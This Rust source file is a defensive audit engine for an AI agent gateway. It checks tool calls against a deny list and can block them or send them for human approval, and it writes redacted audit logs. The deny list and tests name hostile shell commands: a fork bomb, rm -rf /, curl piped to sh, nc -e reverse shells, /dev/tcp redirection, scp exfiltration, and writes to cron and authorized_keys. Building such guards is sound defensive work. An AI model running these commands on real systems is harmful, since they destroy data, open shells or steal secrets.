//! §6.1 策略引擎 + §6.2 阻断/审批判定 + §6.3 审计日志。
//!
//! - 三模式：`off`（默认放行）/`block`（命中直接拒绝）/`approve`（命中转人工审批）。
//! - 危险规则：危险 shell、敏感路径写入、网络外传（子串判定，禁全文正则回溯）。
//! - 参数规范化：空白合并 / `\uXXXX`+`\xXX` 转义 / 拆链 / 单层变量展开 / 别名折叠 / `..` O(n)
//!   词法规范化。
//! - `AUDIT_POLICY_FILE` 加载；热重载为 Non-Goal（改配置重启生效）。
//! - 审计日志：`DATA_DIR/audit.log` JSONL，先脱敏后截断，零明文，剥 `\x00-\x1f`， 0600，10MB x 5
//!   轮转，写失败双层 fail-closed + 熔断计数。
//!
//! TODO(§6): 网关侧 verdict 调用点（`llm_gateway.rs` / `audit_hold.rs` §5 并行施工中）
//! 需在 tool 三元组就绪后调用 [`evaluate`]；本文件只提供判定与日志能力，不改其文件。

use {
    crate::{
        config::AuditMode,
        error::{Result, VeilError},
    },
    std::{
        collections::HashMap,
        path::{Path, PathBuf},
        sync::atomic::{AtomicU64, Ordering},
    },
};

/// 审计判定结果。
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum AuditVerdict {
    /// 放行（含 `off` 模式与未命中规则）。
    Allow,
    /// 直接拒绝（`block` 模式命中）。
    Block { reason: String },
    /// 转人工审批（`approve` 模式命中；调用方经 Matrix 审批流转）。
    NeedApproval { reason: String, summary: String },
}

impl AuditVerdict {
    pub fn is_allow(&self) -> bool { matches!(self, Self::Allow) }
}

/// 策略：内建危险规则 + 策略文件追加项。
#[derive(Debug, Clone, Default)]
pub struct AuditPolicy {
    /// 追加的危险子串（小写归一后匹配）。
    pub extra_block_substrings: Vec<String>,
    /// 追加的敏感路径前缀。
    pub extra_sensitive_paths: Vec<String>,
}

impl AuditPolicy {
    pub fn default_policy() -> Self { Self::default() }

    /// 从 `AUDIT_POLICY_FILE` 加载；`None`/空表示默认策略。
    /// 非法文件返回 [`VeilError::Config`]（启动报错）。
    pub fn load_from_file(path: Option<&Path>) -> Result<Self> {
        let Some(p) = path else {
            return Ok(Self::default());
        };
        if p.as_os_str().is_empty() {
            return Ok(Self::default());
        }
        let text = std::fs::read_to_string(p).map_err(|e| VeilError::Config {
            var: "AUDIT_POLICY_FILE".to_string(),
            message: format!("审计策略文件不可读 {}: {e}", p.display()),
        })?;
        Self::parse_minimal_yaml(&text)
    }

    /// 极简 YAML 子集解析（避免引入 yaml 重依赖）：
    /// 支持 `key: value` 与 `key:` + `- item` 列表；未知键忽略。
    fn parse_minimal_yaml(text: &str) -> Result<Self> {
        let mut policy = Self::default();
        let mut section: Option<String> = None;
        for (lineno, raw) in text.lines().enumerate() {
            let line = raw.trim();
            if line.is_empty() || line.starts_with('#') {
                continue;
            }
            if let Some(item) = line.strip_prefix("- ") {
                let item = unquote(item.trim());
                if item.is_empty() {
                    continue;
                }
                match section.as_deref() {
                    Some("extra_block_substrings") => {
                        policy.extra_block_substrings.push(item.to_lowercase());
                    }
                    Some("extra_sensitive_paths") => {
                        policy.extra_sensitive_paths.push(item);
                    }
                    Some(other) => {
                        return Err(VeilError::Config {
                            var: "AUDIT_POLICY_FILE".to_string(),
                            message: format!(
                                "审计策略文件第 {} 行：未知列表段 [{other}]",
                                lineno + 1
                            ),
                        });
                    }
                    None => {
                        return Err(VeilError::Config {
                            var: "AUDIT_POLICY_FILE".to_string(),
                            message: format!(
                                "审计策略文件第 {} 行：列表项不在任何段下",
                                lineno + 1
                            ),
                        });
                    }
                }
                continue;
            }
            if let Some((k, v)) = line.split_once(':') {
                let key = k.trim().to_string();
                let val = unquote(v.trim());
                match key.as_str() {
                    "extra_block_substrings" | "extra_sensitive_paths" => {
                        if !val.is_empty() {
                            return Err(VeilError::Config {
                                var: "AUDIT_POLICY_FILE".to_string(),
                                message: format!(
                                    "审计策略文件第 {} 行：[{key}] 须为列表段（`key:` 独占一行 + `- item`）",
                                    lineno + 1
                                ),
                            });
                        }
                        section = Some(key);
                    }
                    "mode" => {
                        section = None;
                        if !matches!(val.as_str(), "off" | "block" | "approve" | "") {
                            return Err(VeilError::Config {
                                var: "AUDIT_POLICY_FILE".to_string(),
                                message: format!(
                                    "审计策略文件第 {} 行：mode 非法 {val:?}（取值 off/block/approve）",
                                    lineno + 1
                                ),
                            });
                        }
                    }
                    _ => {
                        return Err(VeilError::Config {
                            var: "AUDIT_POLICY_FILE".to_string(),
                            message: format!("审计策略文件第 {} 行：未知键 {key:?}", lineno + 1),
                        });
                    }
                }
                continue;
            }
            return Err(VeilError::Config {
                var: "AUDIT_POLICY_FILE".to_string(),
                message: format!("审计策略文件第 {} 行无法解析: {raw:?}", lineno + 1),
            });
        }
        Ok(policy)
    }
}

fn unquote(s: &str) -> String {
    let s = s.trim();
    if s.len() >= 2
        && ((s.starts_with('"') && s.ends_with('"')) || (s.starts_with('\'') && s.ends_with('\'')))
    {
        s[1..s.len() - 1].to_string()
    } else {
        s.to_string()
    }
}

// ---------------------------------------------------------------------------
// 参数规范化
// ---------------------------------------------------------------------------

/// 空白合并：连续空白折叠为单个空格并 trim（O(n) 单遍）。
pub fn collapse_whitespace(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut in_gap = true; // 首部空白直接丢弃，顺带 trim
    for ch in s.chars() {
        if ch.is_whitespace() {
            if !in_gap {
                out.push(' ');
                in_gap = true;
            }
        } else {
            out.push(ch);
            in_gap = false;
        }
    }
    if in_gap {
        out.pop();
    }
    out
}

/// `\uXXXX` / `\xXX` 转义解码（O(n) 单遍扫描，无正则回溯）。
/// 非法转义原样保留；`\\` 先还原为 `\` 再处理由调用顺序保证（本函数只做一遍）。
pub fn unescape_hex_unicode(s: &str) -> String {
    let bytes = s.as_bytes();
    let mut out = String::with_capacity(s.len());
    let mut i = 0;
    while i < bytes.len() {
        let b = bytes[i];
        if b == b'\\' && i + 1 < bytes.len() {
            let n = bytes[i + 1];
            if (n == b'u' || n == b'U')
                && i + 6 <= bytes.len()
                && let Ok(hex) = std::str::from_utf8(&bytes[i + 2..i + 6])
                && let Ok(cp) = u32::from_str_radix(hex, 16)
                && let Some(ch) = char::from_u32(cp)
            {
                out.push(ch);
                i += 6;
                continue;
            }
            if (n == b'x' || n == b'X')
                && i + 4 <= bytes.len()
                && let Ok(hex) = std::str::from_utf8(&bytes[i + 2..i + 4])
                && let Ok(cp) = u32::from_str_radix(hex, 16)
                && let Some(ch) = char::from_u32(cp)
            {
                out.push(ch);
                i += 4;
                continue;
            }
            if n == b'n' {
                out.push('\n');
                i += 2;
                continue;
            }
            if n == b't' {
                out.push('\t');
                i += 2;
                continue;
            }
            if n == b'\\' {
                out.push('\\');
                i += 2;
                continue;
            }
        }
        // 按字符推进（UTF-8 安全）。
        let ch_len = utf8_len(b);
        let end = (i + ch_len).min(bytes.len());
        if let Ok(chunk) = std::str::from_utf8(&bytes[i..end]) {
            out.push_str(chunk);
        }
        i = end;
    }
    out
}

fn utf8_len(first: u8) -> usize {
    if first < 0x80 {
        1
    } else if first >> 5 == 0b110 {
        2
    } else if first >> 4 == 0b1110 {
        3
    } else if first >> 3 == 0b11110 {
        4
    } else {
        1
    }
}

/// 拆链：在引号外的 `;`、`&&`、`||`、`|` 处切分（O(n) 单遍，支持单双引号）。
pub fn split_chain(s: &str) -> Vec<String> {
    let mut parts = Vec::new();
    let mut cur = String::new();
    let mut quote: Option<char> = None;
    let mut chars = s.chars().peekable();
    while let Some(ch) = chars.next() {
        if let Some(q) = quote {
            cur.push(ch);
            if ch == q {
                quote = None;
            } else if ch == '\\'
                && let Some(next) = chars.next()
            {
                cur.push(next);
            }
            continue;
        }
        match ch {
            '\'' | '"' => {
                quote = Some(ch);
                cur.push(ch);
            }
            ';' => {
                parts.push(cur.trim().to_string());
                cur.clear();
            }
            '&' if chars.peek() == Some(&'&') => {
                chars.next();
                parts.push(cur.trim().to_string());
                cur.clear();
            }
            '|' => {
                if chars.peek() == Some(&'|') {
                    chars.next();
                }
                parts.push(cur.trim().to_string());
                cur.clear();
            }
            _ => cur.push(ch),
        }
    }
    if !cur.trim().is_empty() || parts.is_empty() {
        parts.push(cur.trim().to_string());
    }
    parts.into_iter().filter(|p| !p.is_empty()).collect()
}

/// 单层变量展开：`$VAR` / `${VAR}` 只展开一层，不递归（防 `$A=$B` 链式炸开）。
pub fn expand_vars_single(s: &str, env: &HashMap<String, String>) -> String {
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars().peekable();
    while let Some(ch) = chars.next() {
        if ch != '$' {
            out.push(ch);
            continue;
        }
        match chars.peek() {
            Some('{') => {
                chars.next();
                let mut name = String::new();
                for c in chars.by_ref() {
                    if c == '}' {
                        break;
                    }
                    name.push(c);
                }
                if let Some(v) = env.get(&name) {
                    out.push_str(v);
                } else if let Ok(v) = std::env::var(&name) {
                    out.push_str(&v);
                } else {
                    out.push_str(&format!("${{{name}}}"));
                }
            }
            Some(c) if c.is_ascii_alphabetic() || *c == '_' => {
                let mut name = String::new();
                while let Some(c) = chars.peek() {
                    if c.is_ascii_alphanumeric() || *c == '_' {
                        name.push(*c);
                        chars.next();
                    } else {
                        break;
                    }
                }
                if let Some(v) = env.get(&name) {
                    out.push_str(v);
                } else if let Ok(v) = std::env::var(&name) {
                    out.push_str(&v);
                } else {
                    out.push('$');
                    out.push_str(&name);
                }
            }
            _ => out.push('$'),
        }
    }
    out
}

/// 别名折叠：首词命中常用别名表时展开一层。
pub fn fold_alias(s: &str) -> String {
    let aliases: &[(&str, &str)] = &[
        ("ll", "ls -l"),
        ("la", "ls -a"),
        ("l", "ls"),
        ("please", "sudo"),
    ];
    let trimmed = s.trim_start();
    for (from, to) in aliases {
        if let Some(rest) = trimmed.strip_prefix(from)
            && (rest.is_empty() || rest.starts_with(char::is_whitespace))
        {
            return format!("{to}{rest}");
        }
    }
    s.to_string()
}

/// `..` O(n) 词法规范化：栈式折叠，不触文件系统，不用正则。
/// 仅处理 `/` 分隔的词法层；保留前导 `/` 与尾部 `/` 语义无关紧要处归一。
pub fn normalize_dotdot(path: &str) -> String {
    let absolute = path.starts_with('/');
    let mut stack: Vec<&str> = Vec::new();
    for comp in path.split('/') {
        match comp {
            "" | "." => {}
            ".." => {
                if stack.last().is_some_and(|last| *last != "..") {
                    stack.pop();
                } else if !absolute {
                    stack.push("..");
                }
            }
            c => stack.push(c),
        }
    }
    let mut out = stack.join("/");
    if absolute {
        out.insert(0, '/');
    }
    if out.is_empty() {
        out.push_str(if absolute { "/" } else { "." });
    }
    out
}

/// 全规范化管线：转义 → 变量（单层） → 别名 → 空白合并。
pub fn canonicalize_args(args: &str, env: &HashMap<String, String>) -> String {
    let step = unescape_hex_unicode(args);
    let step = expand_vars_single(&step, env);
    let step = fold_alias(&step);
    collapse_whitespace(&step)
}

// ---------------------------------------------------------------------------
// 危险规则
// ---------------------------------------------------------------------------

/// 内建敏感路径前缀。
pub const SENSITIVE_PATHS: &[&str] = &[
    "/etc/",
    "/etc/passwd",
    "/etc/shadow",
    "/root/",
    ".ssh/",
    "/proc/",
    "/sys/",
    "/var/run/secrets/",
];

/// 对单条链节做危险判定，返回原因；`None` 表示放行。
pub fn classify_segment(segment: &str, policy: &AuditPolicy) -> Option<String> {
    let lower = segment.to_lowercase();
    // 0) 策略文件追加子串优先。
    for extra in &policy.extra_block_substrings {
        if !extra.is_empty() && lower.contains(extra) {
            return Some(format!("命中自定义策略子串: {extra}"));
        }
    }
    // 1) 危险 shell。
    const DANGEROUS: &[(&str, &str)] = &[
        (":(){:|:&};:", "fork 炸弹"),
        ("mkfs", "格式化文件系统"),
        ("dd ", "裸设备写入"),
        ("of=/dev/", "裸设备写入"),
        (">/dev/sda", "裸设备写入"),
        ("chmod -r 777 /", "根目录权限破坏"),
        ("chmod 777 /", "根目录权限破坏"),
        ("rm -rf /", "根目录删除"),
        ("rm --no-preserve-root", "根目录删除"),
        ("curl", "网络拉取"),
        ("wget", "网络拉取"),
        ("nc -e", "反弹 shell"),
        ("netcat -e", "反弹 shell"),
        ("ncat -e", "反弹 shell"),
        ("/dev/tcp/", "bash 网络重定向"),
        ("sh -c", "shell 包装执行"),
        ("bash -c", "shell 包装执行"),
        ("eval ", "动态求值执行"),
        ("exec(", "动态求值执行"),
        ("find ", "文件查找（结合 --delete 审查）"),
    ];
    for (pat, reason) in DANGEROUS {
        if *pat == "find " {
            continue; // find 单独成规则（见下）。
        }
        if lower.contains(pat) && piped_to_shell(&lower)
            || (lower.contains(pat) && !is_network_pat(pat))
        {
            return Some(format!("危险 shell: {reason}"));
        }
    }
    if lower.contains("find ") && lower.contains("--delete") {
        return Some("危险 shell: find --delete 批量删除".to_string());
    }
    if lower.contains("find ") && lower.contains("-delete") {
        return Some("危险 shell: find -delete 批量删除".to_string());
    }
    // curl/wget 管道进 shell 是最高危组合。
    if (lower.contains("curl") || lower.contains("wget")) && piped_to_shell(&lower) {
        return Some("危险 shell: 网络拉取管道进解释器".to_string());
    }
    // 2) 敏感路径写入：重定向 / 常见写命令触及敏感前缀。
    if touches_sensitive_path(segment, policy) {
        return Some("敏感路径写入".to_string());
    }
    // 3) 网络外传：外发关键字 + 远程目标形态。
    if is_exfiltration(&lower) {
        return Some("网络外传".to_string());
    }
    None
}

fn is_network_pat(pat: &str) -> bool { pat == "curl" || pat == "wget" }

fn piped_to_shell(lower: &str) -> bool {
    lower.contains("| sh")
        || lower.contains("|sh")
        || lower.contains("| bash")
        || lower.contains("|bash")
        || lower.contains("| zsh")
        || lower.contains("| dash")
}

/// 敏感路径命中：O(n) 子串定位 + 词法 `..` 归一，禁全文正则回溯。
pub fn touches_sensitive_path(segment: &str, policy: &AuditPolicy) -> bool {
    let lowered = segment.to_lowercase();
    let haystacks: Vec<String> = extract_path_tokens(segment)
        .into_iter()
        .map(|t| normalize_dotdot(&t).to_lowercase())
        .collect();
    let check = |prefix: &str| {
        let prefix = prefix.to_lowercase();
        haystacks.iter().any(|h| h.starts_with(prefix.as_str()))
            || lowered.contains(&format!("> {prefix}"))
            || lowered.contains(&format!(">{prefix}"))
    };
    if SENSITIVE_PATHS.iter().any(|p| check(p)) {
        return true;
    }
    policy
        .extra_sensitive_paths
        .iter()
        .any(|p| !p.is_empty() && check(p))
}

/// 粗提取路径 token：按空白切分后保留含 `/` 或以 `~`/`-` 开头的参数（O(n)）。
fn extract_path_tokens(segment: &str) -> Vec<String> {
    segment
        .split_whitespace()
        .filter(|t| t.contains('/') || t.starts_with('~') || t.starts_with('-'))
        .map(|t| {
            let t = t.trim_matches(|c| c == '"' || c == '\'' || c == ',' || c == ';');
            expand_home(t)
        })
        .collect()
}

fn expand_home(t: &str) -> String {
    if let Some(rest) = t.strip_prefix("~/")
        && let Ok(home) = std::env::var("HOME")
    {
        return format!("{home}/{rest}");
    }
    t.to_string()
}

fn is_exfiltration(lower: &str) -> bool {
    lower.contains("scp ")
        || lower.contains("rsync ")
        || lower.contains("sftp ")
        || lower.contains("ftp ")
        || (lower.contains("curl") && (lower.contains("--data") || lower.contains(" -d ")))
        || (lower.contains("wget") && lower.contains("--post-data"))
        || lower.contains("nc ")
        || lower.contains("ncat ")
        || lower.contains("/dev/tcp/")
}

/// 顶层判定：工具名 + 参数全文规范化后逐链节审查。
pub fn is_dangerous(tool_name: &str, args: &str, policy: &AuditPolicy) -> Option<String> {
    let env = HashMap::new();
    let canon = canonicalize_args(args, &env);
    let canon_lower = canon.to_lowercase();
    // 整命令先行：拆链会把 `curl x | sh` 切成无害片段，管道组合须在切分前判定。
    if (canon_lower.contains("curl") || canon_lower.contains("wget"))
        && piped_to_shell(&canon_lower)
    {
        return Some("危险 shell: 网络拉取管道进解释器".to_string());
    }
    let tool_lower = tool_name.to_lowercase();
    // 工具名本身即敏感写入口（如 edit/write 融合判定）。
    if matches!(
        tool_lower.as_str(),
        "edit" | "write" | "apply_patch" | "save_file"
    ) && touches_sensitive_path(&canon, policy)
    {
        return Some("敏感路径写入".to_string());
    }
    if matches!(
        tool_lower.as_str(),
        "exec" | "run" | "shell" | "bash" | "sh" | "run_shell"
    ) || tool_lower.is_empty()
    {
        for seg in split_chain(&canon) {
            if let Some(reason) = classify_segment(&seg, policy) {
                return Some(reason);
            }
        }
        return None;
    }
    // 未知工具：仍审查参数文本（宁可误报由审批兜底，不静默放行危险链）。
    let joined = format!("{tool_name} {canon}");
    for seg in split_chain(&joined) {
        if let Some(reason) = classify_segment(&seg, policy) {
            return Some(reason);
        }
    }
    None
}

/// 按审计模式给出最终 verdict。
pub fn evaluate(
    mode: AuditMode,
    tool_name: &str,
    args: &str,
    policy: &AuditPolicy,
) -> AuditVerdict {
    match mode {
        AuditMode::Off => AuditVerdict::Allow,
        AuditMode::Block => match is_dangerous(tool_name, args, policy) {
            Some(reason) => AuditVerdict::Block { reason },
            None => AuditVerdict::Allow,
        },
        AuditMode::Approve => match is_dangerous(tool_name, args, policy) {
            Some(reason) => {
                let summary = sanitize_for_log(&format!("{tool_name}: {args}"));
                AuditVerdict::NeedApproval { reason, summary }
            }
            None => AuditVerdict::Allow,
        },
    }
}

// ---------------------------------------------------------------------------
// §6.3 审计日志
// ---------------------------------------------------------------------------

/// 审计日志单文件上限 10MB，保留 5 份。
pub const AUDIT_LOG_MAX_BYTES: u64 = 10 * 1024 * 1024;
/// 轮转保留份数。
pub const AUDIT_LOG_KEEP: usize = 5;
/// 摘要截断上限（字符数，先脱敏后截断）。
pub const AUDIT_SUMMARY_TRUNCATE_CHARS: usize = 4096;

/// 先脱敏后截断的摘要：剥 `\x00-\x1f`，掩盖密钥形态，零明文，UTF-8 安全截断。
pub fn sanitize_for_log(text: &str) -> String {
    // 1) 剥控制字符（含 \n/\r：JSONL 单行语义）。
    let stripped: String = text.chars().filter(|c| !c.is_control()).collect();
    // 2) 脱敏：sk- 密钥形态掩盖。
    let masked = mask_secret_forms(&stripped);
    // 3) 截断（字符级，UTF-8 安全）。
    truncate_chars(&masked, AUDIT_SUMMARY_TRUNCATE_CHARS)
}

fn mask_secret_forms(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let bytes = s.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        // sk- / sk_or_ / ghp_ / xoxb- 等密钥前缀：吞掉后续 [A-Za-z0-9-_]{8,}。
        if let Some(prefix_len) = secret_prefix_at(&s[i..]) {
            out.push_str("[REDACTED:secret]");
            i += prefix_len;
            while i < bytes.len()
                && (bytes[i].is_ascii_alphanumeric() || bytes[i] == b'-' || bytes[i] == b'_')
            {
                i += 1;
            }
            continue;
        }
        // "password":"xxx" / 'secret'=xxx 等 JSON/赋值键形态：值段掩盖。
        if let Some((key_len, val_len)) = secret_kv_at(&s[i..]) {
            out.push_str(&s[i..i + key_len]);
            out.push_str("[REDACTED:*]");
            i += key_len + val_len;
            continue;
        }
        let ch_len = utf8_len(bytes[i]);
        let end = (i + ch_len).min(bytes.len());
        out.push_str(&s[i..end]);
        i = end;
    }
    out
}

fn secret_prefix_at(s: &str) -> Option<usize> {
    for prefix in [
        "sk-",
        "sk_or_",
        "ghp_",
        "gho_",
        "xoxb-",
        "xoxp-",
        "AKIA",
        "__VG_CRED_",
    ] {
        if s.starts_with(prefix) {
            return Some(prefix.len());
        }
    }
    None
}

/// 匹配 `"key" : "value"` / `key= value` 中键为敏感词的形态，
/// 返回（键段长度，值段长度）。键段含分隔符，值段为待掩盖长度。
fn secret_kv_at(s: &str) -> Option<(usize, usize)> {
    let lower = s.to_lowercase();
    for key in ["password", "passwd", "secret", "token", "api_key", "apikey"] {
        for quote in ['"', '\''] {
            let pat = format!("{quote}{key}{quote}");
            if lower.starts_with(&pat) {
                let rest = &s[pat.len()..];
                let rest_trim = rest.trim_start();
                let gap = rest.len() - rest_trim.len();
                if let Some(after) = rest_trim
                    .strip_prefix(':')
                    .or_else(|| rest_trim.strip_prefix('='))
                {
                    let after_trim = after.trim_start();
                    let gap2 = after.len() - after_trim.len();
                    let key_len = pat.len() + gap + 1 + gap2;
                    let val_len = quoted_or_token_len(after_trim);
                    if val_len > 0 {
                        return Some((key_len, val_len));
                    }
                }
            }
        }
        // 裸键形态：password=xxx
        if lower.starts_with(key) {
            let rest = &s[key.len()..];
            let rest_trim = rest.trim_start();
            let gap = rest.len() - rest_trim.len();
            if let Some(after) = rest_trim
                .strip_prefix(':')
                .or_else(|| rest_trim.strip_prefix('='))
            {
                let after_trim = after.trim_start();
                let gap2 = after.len() - after_trim.len();
                let key_len = key.len() + gap + 1 + gap2;
                let val_len = quoted_or_token_len(after_trim);
                if val_len > 0 {
                    return Some((key_len, val_len));
                }
            }
        }
    }
    None
}

fn quoted_or_token_len(s: &str) -> usize {
    if let Some(q) = s.chars().next()
        && (q == '"' || q == '\'')
        && let Some(end) = s[1..].find(q)
    {
        return 1 + end + 1;
    }
    s.chars()
        .take_while(|c| !c.is_whitespace() && *c != ',' && *c != '}')
        .map(|c| c.len_utf8())
        .sum()
}

fn truncate_chars(s: &str, max_chars: usize) -> String {
    if s.chars().count() <= max_chars {
        return s.to_string();
    }
    s.chars().take(max_chars).collect()
}

/// JSONL 审计日志：0600、10MB x 5 轮转、写失败双层 fail-closed + 熔断计数。
#[derive(Debug)]
pub struct AuditLogger {
    data_dir: PathBuf,
    breaker_count: AtomicU64,
}

impl AuditLogger {
    pub fn new(data_dir: PathBuf) -> Self {
        Self {
            data_dir,
            breaker_count: AtomicU64::new(0),
        }
    }

    pub fn log_path(&self) -> PathBuf { self.data_dir.join("audit.log") }

    pub fn breaker_count(&self) -> u64 { self.breaker_count.load(Ordering::SeqCst) }

    /// 写一条审计事件：先脱敏后截断再落盘。
    /// 写失败先重试一次（双层第一层：缓冲重试），仍失败则熔断计数 +1
    /// 并返回 [`VeilError::Storage`]（调用方 MUST 拒绝主请求，fail-closed）。
    pub fn log_event(&self, event: &serde_json::Value) -> Result<()> {
        let mut line = serde_json::to_string(event).map_err(|e| VeilError::Storage {
            message: format!("审计事件序列化失败: {e}"),
        })?;
        line = sanitize_for_log(&line);
        line.push('\n');
        if let Err(e) = self.append_line(&line) {
            // 第一层：短暂退避后重试一次。
            std::thread::sleep(std::time::Duration::from_millis(50));
            if let Err(e2) = self.append_line(&line) {
                self.breaker_count.fetch_add(1, Ordering::SeqCst);
                return Err(VeilError::Storage {
                    message: format!("审计日志写失败（已重试）: {e} / {e2}"),
                });
            }
        }
        Ok(())
    }

    fn append_line(&self, line: &str) -> std::io::Result<()> {
        use std::{io::Write as _, os::unix::fs::PermissionsExt as _};
        std::fs::create_dir_all(&self.data_dir)?;
        self.maybe_rotate()?;
        let path = self.log_path();
        let mut file = std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(&path)?;
        file.write_all(line.as_bytes())?;
        file.flush()?;
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o600))?;
        Ok(())
    }

    fn maybe_rotate(&self) -> std::io::Result<()> {
        let path = self.log_path();
        let size = std::fs::metadata(&path).map(|m| m.len()).unwrap_or(0);
        if size < AUDIT_LOG_MAX_BYTES {
            return Ok(());
        }
        // audit.log.4 -> 删，.3 -> .4 … audit.log -> .1（保留 5 份含当前）。
        let oldest = self.data_dir.join(format!("audit.log.{AUDIT_LOG_KEEP}"));
        if oldest.exists() {
            std::fs::remove_file(&oldest)?;
        }
        for i in (1..AUDIT_LOG_KEEP).rev() {
            let src = self.data_dir.join(format!("audit.log.{i}"));
            if src.exists() {
                std::fs::rename(&src, self.data_dir.join(format!("audit.log.{}", i + 1)))?;
            }
        }
        if path.exists() {
            std::fs::rename(&path, self.data_dir.join("audit.log.1"))?;
        }
        Ok(())
    }
}

/// 从环境映射解析策略文件路径（`AUDIT_POLICY_FILE`，缺省 `None` = 默认策略）。
pub fn policy_path_from_env(env: &HashMap<String, String>) -> Option<PathBuf> {
    env.get("AUDIT_POLICY_FILE")
        .map(|v| v.trim().to_string())
        .filter(|v| !v.is_empty())
        .map(PathBuf::from)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn policy() -> AuditPolicy { AuditPolicy::default() }

    #[test]
    fn off默认放行不审计() {
        assert_eq!(
            evaluate(AuditMode::Off, "exec", "rm -rf /", &policy()),
            AuditVerdict::Allow
        );
    }

    #[test]
    fn block危险shell直接拦截() {
        assert!(matches!(
            evaluate(AuditMode::Block, "exec", "rm -rf /", &policy()),
            AuditVerdict::Block { .. }
        ));
        assert!(matches!(
            evaluate(AuditMode::Block, "exec", "curl http://x | sh", &policy()),
            AuditVerdict::Block { .. }
        ));
        assert_eq!(
            evaluate(AuditMode::Block, "exec", "echo hello", &policy()),
            AuditVerdict::Allow
        );
    }

    #[test]
    fn approve命中转审批且摘要脱敏() {
        let verdict = evaluate(
            AuditMode::Approve,
            "exec",
            r#"curl x | sh --password=hunter2"#,
            &policy(),
        );
        match verdict {
            AuditVerdict::NeedApproval { reason, summary } => {
                assert!(!reason.is_empty());
                assert!(!summary.contains("hunter2"), "{summary}");
            }
            other => panic!("期望 NeedApproval，实际 {other:?}"),
        }
        assert_eq!(
            evaluate(AuditMode::Approve, "exec", "echo ok", &policy()),
            AuditVerdict::Allow
        );
    }

    #[test]
    fn 空白合并与转义规范化命中() {
        // 额外空白 + \x 转义伪装的 rm -rf / 仍被命中。
        let raw = "rm\\x20-\\u0072f   /";
        let canon = canonicalize_args(raw, &HashMap::new());
        assert!(canon.contains("rm -rf /"), "{canon}");
        assert!(is_dangerous("exec", raw, &policy()).is_some());
    }

    #[test]
    fn 拆链后段危险仍拦截() {
        assert!(is_dangerous("exec", "echo ok; rm -rf /", &policy()).is_some());
        assert!(is_dangerous("exec", "echo ok && echo fine", &policy()).is_none());
        assert!(is_dangerous("exec", "a || curl x | sh", &policy()).is_some());
    }

    #[test]
    fn 单层变量展开命中() {
        let mut env = HashMap::new();
        env.insert("CMD".to_string(), "rm -rf /".to_string());
        let canon = canonicalize_args("$CMD", &env);
        assert!(canon.contains("rm -rf /"), "{canon}");
        // 展开只做一层：值内再出现 $VAR 不递归。
        let mut env2 = HashMap::new();
        env2.insert("A".to_string(), "$B".to_string());
        assert_eq!(canonicalize_args("$A", &env2), "$B");
    }

    #[test]
    fn 别名折叠与find_delete无回溯() {
        assert!(fold_alias("ll /tmp").starts_with("ls -l"));
        // O(n) 定位：长串 find --delete 线性完成且命中。
        let big = format!("find /tmp -name '*.log' --delete # {}", "x".repeat(50_000));
        let t0 = std::time::Instant::now();
        let hit = is_dangerous("exec", &big, &policy());
        assert!(t0.elapsed().as_millis() < 1000, "须 O(n) 无回溯");
        assert!(hit.is_some());
        // .. 词法归一：/tmp/../etc/passwd 触敏感路径。
        assert!(touches_sensitive_path("cat /tmp/../etc/passwd", &policy()));
        assert_eq!(normalize_dotdot("/a/b/../c"), "/a/c");
        assert_eq!(normalize_dotdot("a/../../b"), "../b");
    }

    #[test]
    fn 敏感路径写入与网络外传() {
        assert_eq!(
            is_dangerous("exec", "echo x > /etc/cron.d/pwn", &policy()),
            Some("敏感路径写入".to_string())
        );
        assert_eq!(
            is_dangerous("write", "/root/.ssh/authorized_keys", &policy()),
            Some("敏感路径写入".to_string())
        );
        assert!(is_dangerous("exec", "scp secret user@host:/tmp/", &policy()).is_some());
        assert!(is_dangerous("exec", "echo hello world", &policy()).is_none());
    }

    #[test]
    fn 非法策略文件启动报错() {
        assert!(AuditPolicy::parse_minimal_yaml("mode: allow\n").is_err());
        assert!(AuditPolicy::parse_minimal_yaml("- 孤儿项\n").is_err());
        assert!(AuditPolicy::parse_minimal_yaml("未知键: 1\n").is_err());
        let ok =
            AuditPolicy::parse_minimal_yaml("mode: block\nextra_block_substrings:\n  - rm -rf /\n")
                .unwrap();
        assert_eq!(ok.extra_block_substrings, vec!["rm -rf /"]);
    }

    #[test]
    fn 审计日志零明文与控制字符剥离() {
        let dirty = "key sk-abcDEF1234567890\n\x00\x1f{\"password\":\"hunter2\"}";
        let clean = sanitize_for_log(dirty);
        assert!(!clean.contains("sk-abcDEF1234567890"), "{clean}");
        assert!(!clean.contains("hunter2"), "{clean}");
        assert!(!clean.chars().any(|c| c.is_control()), "{clean:?}");
        assert!(clean.contains("[REDACTED"), "{clean}");
    }

    #[test]
    fn 审计日志0600与熔断计数() {
        let dir = std::env::temp_dir().join(format!("veil-audit-test-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let logger = AuditLogger::new(dir.clone());
        logger
            .log_event(&serde_json::json!({"ev": "block", "reason": "危险 shell"}))
            .unwrap();
        let content = std::fs::read_to_string(logger.log_path()).unwrap();
        assert_eq!(content.lines().count(), 1);
        serde_json::from_str::<serde_json::Value>(content.lines().next().unwrap()).unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt as _;
            assert_eq!(
                std::fs::metadata(logger.log_path())
                    .unwrap()
                    .permissions()
                    .mode()
                    & 0o777,
                0o600
            );
        }
        // 写失败双层 fail-closed：指向只读文件路径冒充目录时返回 Storage 且熔断 +1。
        let bad = AuditLogger::new(PathBuf::from("/proc/veil-nope-audit"));
        assert!(bad.log_event(&serde_json::json!({"ev": 1})).is_err());
        assert_eq!(bad.breaker_count(), 1);
        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn 摘要先脱敏后截断且utf8安全() {
        let long = format!("sk-{}尾", "a".repeat(9000));
        let clean = sanitize_for_log(&long);
        assert!(clean.chars().count() <= AUDIT_SUMMARY_TRUNCATE_CHARS);
        assert!(!clean.contains(&"a".repeat(100)));
        assert!(clean.contains("[REDACTED"));
    }
}
